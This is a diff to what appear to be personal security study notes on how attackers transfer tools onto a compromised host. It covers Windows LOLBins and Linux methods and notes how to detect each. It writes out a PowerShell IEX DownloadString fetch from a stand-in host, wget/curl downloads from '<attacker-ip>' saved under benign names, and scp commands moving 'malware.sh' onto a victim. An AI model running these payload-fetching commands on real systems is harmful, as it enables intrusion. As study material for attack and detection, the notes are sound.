@@ -5,6 +5,8 @@ Once an attacker has access to a host, they often need to pull additional toolin
 - Attackers prefer signed, built-in Windows binaries for this (*Living off the Land Binaries*, or **LOLBins**), because they are already present, usually trusted, and blend in with normal admin activity.
 - A common trick is to download the payload under a benign output name (e.g. `good.exe`) to look less suspicious.
 
+> This is also done on Linux machines, check [[#Linux]].
+
 > See [LOLBAS](https://lolbas-project.github.io/) for the catalogue of built-in binaries abused this way.
 
 ---
@@ -50,19 +52,34 @@ IEX (New-Object Net.WebClient).DownloadString('https://blackhat.thm/script.ps1')
 ---
 ### Linux
 
+On the attacker's machine, in the folder holding the tool:
 ```bash
-# On the attacker's machine, in the folder holding the tool:
 python3 -m http.server 80
 ```
 - Spins up a quick HTTP server to host the payload.
 
+On the target:
 ```bash
-# On the target:
 wget http://<attacker-ip>/bad.sh -O good.sh
 curl http://<attacker-ip>/bad.sh -o good.sh
 ```
 - `wget -O` and `curl -o` both save the download to a named file.
 - See [[Linux Privilege Escalation#Automated Enumeration Tools]] for this exact workflow used to transfer enumeration scripts.
+
+Another technique is to use the **Secure Copy Protocol, SCP**:
+- SCP works by either pushing data to a machine, or pulling data on to a machine.
+
+The attacker machine can push a tool on to the victim using:
+```
+scp ./malware.sh victim-user@victim-machine:/tmp
+```
+- This can be detected on the victim machine by logging an [[Secure Shell Protocol (SSH)]] connection from the attackers machine. Can be found in the `auth.log`, check [[Logs]].
+
+The victim machine can pull the tool from the attacker if a shell has been established there using:
+```
+scp attacker-user@attacker-machine:./malware.sh /tmp
+```
+- This can be detected by looking for execution traces of the `scp` command on the victim. An example is to use the `auditd` [[Logs]].
 
 ---
 ### Prevention & Detection
